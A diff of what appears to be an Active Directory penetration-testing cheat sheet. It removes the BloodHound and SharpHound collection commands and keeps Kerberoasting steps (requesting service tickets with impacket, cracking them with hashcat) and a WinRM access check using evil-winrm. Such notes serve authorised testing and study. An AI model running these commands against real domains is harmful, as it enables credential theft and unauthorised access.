@@ -94,18 +94,6 @@ impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
 hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Collect BloodHound data from Kali
-```bash
-# Add -ns $IP if DNS resolution issues
-bloodhound-python -d domain.local -u username -p password -gc $IP -c all
-```
-
-## Run SharpHound on Windows target for BloodHound
-```cmd
-# Add -d domain.local if needed
-.\SharpHound.exe -c All
-```
-
 ## Test WinRM access with valid credentials
 ```bash
 # netexec for quick test OR evil-winrm for interactive shell
